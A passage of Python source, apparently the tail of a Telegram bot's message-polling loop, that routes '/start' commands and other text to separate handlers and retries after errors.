                    text = m.get("text") or ""
                    mid = m["message_id"]
                    user_obj = m.get("from", {})
                    user = {
                        "name": " ".join(x for x in (user_obj.get("first_name", ""), user_obj.get("last_name", "")) if x).strip() or "Unknown",
                        "username": user_obj.get("username", ""),
                    }
                    if text == "/start":
                        cmd_start(chat_id, mid, user, text)
                    else:
                        handle_text_message(chat_id, text, mid)
        except Exception as e:
            print("loop error:", e)
            time.sleep(3)


if __name__ == "__main__":
    main()
